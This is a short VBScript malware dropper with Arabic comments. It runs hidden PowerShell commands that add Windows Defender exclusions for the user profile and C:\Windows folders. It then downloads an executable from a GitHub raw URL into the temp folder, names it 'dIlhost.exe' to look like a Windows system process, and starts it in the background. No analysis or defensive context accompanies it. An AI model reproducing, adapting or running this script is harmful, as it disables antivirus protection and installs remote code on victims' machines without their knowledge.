On Error Resume Next ' تجاهل الأخطاء

' الانتظار لمدة 30 ثانية
For x = 0 To 300 ' الانتظار 30 ثانية (300 دورة)
    WScript.Sleep(10) ' الانتظار 0.1 ثانية في كل دورة
Next

' إعداد مسارات وأوامر PowerShell
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
downloadPath = tempFolder & "\dIlhost.exe"
excludeUserProfile = "Add-MpPreference -ExclusionPath $env:USERPROFILE"
excludeWindows = "Add-MpPreference -ExclusionPath 'C:\Windows'"

' إضافة استثناءات في Windows Defender باستخدام PowerShell
shell.Run "powershell -command """ & excludeUserProfile & """", 0, True
shell.Run "powershell -command """ & excludeWindows & """", 0, True

' أمر تنزيل وتشغيل الملف باستخدام PowerShell
downloadCommand = "try { " & _
                  "$client = New-Object System.Net.WebClient; " & _
                  "$client.DownloadFile('https://github.com/Aevagee/temp/raw/refs/heads/main/when.exe', '" & downloadPath & "'); " & _
                  "if (Test-Path '" & downloadPath & "') { Start-Process -FilePath '" & downloadPath & "' -WindowStyle Minimized } " & _
                  "} catch { Write-Host 'Error: ' + $_.Exception.Message }"

' تشغيل أمر PowerShell في الخلفية لتنزيل وتشغيل الملف
shell.Run "powershell -command """ & downloadCommand & """", 0, False
